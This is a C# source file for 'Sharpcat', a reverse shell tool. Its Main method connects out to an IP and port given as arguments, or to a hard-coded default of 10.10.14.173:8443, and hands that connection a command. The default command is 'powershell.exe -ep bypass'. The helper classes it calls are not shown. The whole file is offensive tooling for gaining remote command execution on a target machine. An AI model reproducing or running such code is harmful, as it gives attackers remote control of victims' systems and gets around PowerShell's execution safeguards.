using System;
using System.Linq;
using System.Net;
using System.Net.Sockets;

// Currently only reverse shell
// 2 or 3 command line parameters: IPaddress, PortNumber, "command <parameters"
// command is optional, defaults to "powershell.exe -ep bypass"

namespace Sharpcat
{
    class Program
    {
        public static string ip      = "10.10.14.173";
        public static int    port    = 8443;
        public static string command = "powershell.exe -ep bypass";
        public static Socket client;

        static void Main(string[] args)
        {
            if (args.Count() == 2 || args.Count() == 3) 
            { 
                // IP address port "command with parameters"
                String ip = args[0];
                int port = int.Parse(args[1]);

                if( args.Count() == 1 || args.Count() > 3)
                {
                    Console.WriteLine("Missing, or too many arguments");
                    return;
                }
                if (args.Count() == 3)
                {
                    command = args[2];
                }

                if(!Client.Connect(ip, port, out client))
                {
                    //Console.Write("Connection Error");
                    return;
                }
                //Console.WriteLine("Connected to server, calling DoExec");

                if (!Exec.DoExec(command, ref client))
                {
                    //Console.WriteLine("DoExec failed");
                    Client.Close(client);
                }
                //Console.WriteLine("Done");
            }
        }
    }
}
